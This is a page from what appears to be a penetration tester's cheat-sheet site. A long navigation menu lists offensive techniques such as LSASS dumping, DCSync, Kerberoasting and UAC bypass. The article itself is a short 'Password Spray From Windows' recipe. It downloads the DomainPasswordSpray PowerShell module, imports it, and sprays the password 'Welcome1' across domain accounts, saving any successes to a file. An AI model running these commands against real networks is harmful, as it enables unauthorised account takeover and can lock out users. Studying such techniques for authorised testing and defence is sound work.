+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/event-log-readers/" class="">
+      Event Log Readers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/print-operators/" class="">
+      Print Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sebackupprivilege/" class="">
+      Se Backup Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sedebugprivilege/" class="">
+      Se Debug Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/seimpersonateprivilege/" class="">
+      Se Impersonate Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/serestoreprivilege/" class="">
+      Se Restore Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/server-operators/" class="">
+      Server Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/setakeownershipprivilege/" class="">
+      Se Take Ownership Privilege</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/credential-looting/" class="">
+      Credential Looting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/dpapi/" class="">
+      Dpapi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/printnightmare/" class="">
+      Print Nightmare</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/uac-bypass/" class="">
+      Uac Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/user-interactions/" class="">
+      User Interactions</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad0adecc90d787090f7f3f2c668562f3" class="toggle"  />
+    <label for="section-ad0adecc90d787090f7f3f2c668562f3" class="flex">
+      <a role="button" class="">
+        07. Credential Looting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-lsass/" class="">
+      Dump Lsass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-sam/" class="">
+      Dump Sam</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-keytab---linux/" class="">
+      Kerberos Keytab Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-kirbi---windows/" class="">
+      Kerberos Kirbi Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/laps/" class="">
+      Laps</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/virtual-disks/" class="">
+      Virtual Disks</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c02c5639835e2c5e10145947a8080b5" class="toggle"  />
+    <label for="section-2c02c5639835e2c5e10145947a8080b5" class="flex">
+      <a role="button" class="">
+        08. Discovery</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/network-hosts/" class="">
+      Network Hosts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/password-policy/" class="">
+      Password Policy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/ping-sweep/" class="">
+      Ping Sweep</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/user-enumeration/" class="">
+      User Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07686cc097df585dc242bc14dc089ca4" class="toggle"  />
+    <label for="section-07686cc097df585dc242bc14dc089ca4" class="flex">
+      <a role="button" class="">
+        09. Pivoting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/chisel/" class="">
+      Chisel</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/dnscat2/" class="">
+      Dnscat2</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ligolo-ng/" class="">
+      Ligolo Ng</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/port-forward/" class="">
+      Port Forward</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ssh/" class="">
+      SSH</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e1e0aa139ebb047bc9559800a509d69c" class="toggle" checked />
+    <label for="section-e1e0aa139ebb047bc9559800a509d69c" class="flex">
+      <a role="button" class="">
+        10. Lateral Movement</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/adcs-attacks/" class="">
+      Adcs Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/bloodhound/" class="">
+      Bloodhound</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dacl-abuse/" class="">
+      Dacl Abuse</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dcsync/" class="">
+      Dcsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/impacket-exec/" class="">
+      Impacket *Exec</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberoasting/" class="">
+      Kerberoasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberos/" class="">
+      Kerberos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/nopac/" class="">
+      No Pac</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/ntlm-relay/" class="">
+      Ntlm Relay</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-linux/" class="">
+      Password Spray From Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-windows/" class="active">
+      Password Spray From Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/rdp-session-hijacking/" class="">
+      Rdp Session Hijacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/relay-potato/" class="">
+      Relay Potato</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/runas/" class="">
+      Runas</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0bb2b04e93944d81f8c46b09caf99f9f" class="toggle"  />
+    <label for="section-0bb2b04e93944d81f8c46b09caf99f9f" class="flex">
+      <a role="button" class="">
+        File Transfer</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/edge-cases/" class="">
+      Edge Cases</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/encrypted-transfer/" class="">
+      Encrypted Transfer</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/linux-target/" class="">
+      Linux Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/nginx/" class="">
+      Nginx</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/windows-target/" class="">
+      Windows Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-27f3a00f046f423a04ef1a6857a1d881" class="toggle"  />
+    <label for="section-27f3a00f046f423a04ef1a6857a1d881" class="flex">
+      <a role="button" class="">
+        Misc</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/interactive-shell/" class="">
+      Interactive Shell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/python-eval-bypass/" class="">
+      Python Eval Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/tips-and-setup/" class="">
+      Tips and Setup</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4c7affcc57db383fea3db37de311743" class="toggle"  />
+    <label for="section-c4c7affcc57db383fea3db37de311743" class="flex">
+      <a role="button" class="">
+        Password Crack</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashcat/" class="">
+      Hashcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashid/" class="">
+      Hash ID</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/john/" class="">
+      John</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-693d6624a689f7e347a0baca206ef8ad" class="toggle"  />
+    <label for="section-693d6624a689f7e347a0baca206ef8ad" class="flex">
+      <a role="button" class="">
+        Syntax Cheatsheets</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/cewl/" class="">
+      Cewl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/nodejs/" class="">
+      Node Js</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/openssl/" class="">
+      Open Ssl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sed/" class="">
+      Sed</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/shell-fu/" class="">
+      Shell Fu</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sql-syntax/" class="">
+      SQL Syntax</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sqlmap/" class="">
+      Sqlmap</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/spellbook/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Password Spray From Windows</h3>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><blockquote class='book-hint '>
+<p>Don&rsquo;t get locked out. See <code>Password policy</code> section
+Spray and pray</p>
+</blockquote><h1 id="domainpasswordsprayps1"><code>DomainPasswordSpray.ps1</code><a class="anchor" href="#domainpasswordsprayps1">#</a></h1>
+<blockquote class='book-hint '>
+<p>Download, then transfer the ps module to windows with any method in <code>Misc/File Transfer</code></p>
+</blockquote><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>wget https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1</span></span></code></pre></div><p>Import module</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\DomainPasswordSpray.ps1</span></span></code></pre></div><p>Spray and pray</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+  
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/spellbook/10.-lateral-movement/password-spray---from-linux/" class="flex align-center">
+        <img src="/spellbook/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Password Spray From Linux</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/spellbook/10.-lateral-movement/rdp-session-hijacking/" class="flex align-center">
+        <span>Rdp Session Hijacking</span>
+        <img src="/spellbook/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
